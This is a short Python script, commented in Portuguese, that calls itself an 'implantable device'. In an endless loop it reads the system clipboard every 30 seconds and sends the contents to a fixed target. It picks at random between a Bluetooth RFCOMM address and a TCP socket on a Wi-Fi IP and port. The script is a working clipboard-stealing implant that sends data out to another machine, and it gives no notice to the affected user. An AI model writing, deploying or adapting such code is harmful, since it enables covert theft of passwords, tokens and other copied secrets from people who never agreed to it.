import pyperclip
import time
import random
import socket
import bluetooth

# Configurações
BLUETOOTH_TARGET_ADDRESS = "XX:XX:XX:XX:XX:XX"  # Endereço Bluetooth do dispositivo alvo
WIFI_TARGET_IP = "192.168.1.100"  # IP do dispositivo alvo na rede Wi-Fi
WIFI_TARGET_PORT = 12345  # Porta para comunicação Wi-Fi
INTERVALO_COPIAR_COLAR = 30  # Intervalo de tempo em segundos

def copiar_colar_intervalo(intervalo):
    """
    Função que copia o conteúdo da área de transferência e o cola após um intervalo de tempo.
    :param intervalo: Intervalo de tempo em segundos.
    """
    try:
        while True:
            # Copia o conteúdo atual da área de transferência
            conteudo_copiado = pyperclip.paste()
            print(f"Conteúdo copiado: {conteudo_copiado}")

            # Aguarda o intervalo de tempo especificado
            time.sleep(intervalo)

            # Cola o conteúdo copiado (simulado aqui apenas imprimindo)
            print(f"Conteúdo colado após {intervalo} segundos: {conteudo_copiado}")

            # Transmite o conteúdo via Bluetooth ou Wi-Fi
            transmitir_dados(conteudo_copiado)

    except KeyboardInterrupt:
        print("Processo interrompido pelo usuário.")

def transmitir_dados(dados):
    """
    Função que transmite os dados copiados via Bluetooth ou Wi-Fi.
    :param dados: Dados a serem transmitidos.
    """
    # Escolhe aleatoriamente entre Bluetooth e Wi-Fi
    metodo_transmissao = random.choice(["bluetooth", "wifi"])

    if metodo_transmissao == "bluetooth":
        transmitir_via_bluetooth(dados)
    else:
        transmitir_via_wifi(dados)

def transmitir_via_bluetooth(dados):
    """
    Função que transmite os dados via Bluetooth.
    :param dados: Dados a serem transmitidos.
    """
    try:
        # Conecta ao dispositivo Bluetooth alvo
        sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
        sock.connect((BLUETOOTH_TARGET_ADDRESS, 1))
        sock.send(dados)
        sock.close()
        print(f"Dados transmitidos via Bluetooth: {dados}")
    except Exception as e:
        print(f"Erro ao transmitir dados via Bluetooth: {e}")

def transmitir_via_wifi(dados):
    """
    Função que transmite os dados via Wi-Fi.
    :param dados: Dados a serem transmitidos.
    """
    try:
        # Conecta ao dispositivo alvo na rede Wi-Fi
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((WIFI_TARGET_IP, WIFI_TARGET_PORT))
        sock.send(dados.encode())
        sock.close()
        print(f"Dados transmitidos via Wi-Fi: {dados}")
    except Exception as e:
        print(f"Erro ao transmitir dados via Wi-Fi: {e}")

if __name__ == "__main__":
    print("Iniciando dispositivo implantável...")
    copiar_colar_intervalo(INTERVALO_COPIAR_COLAR)
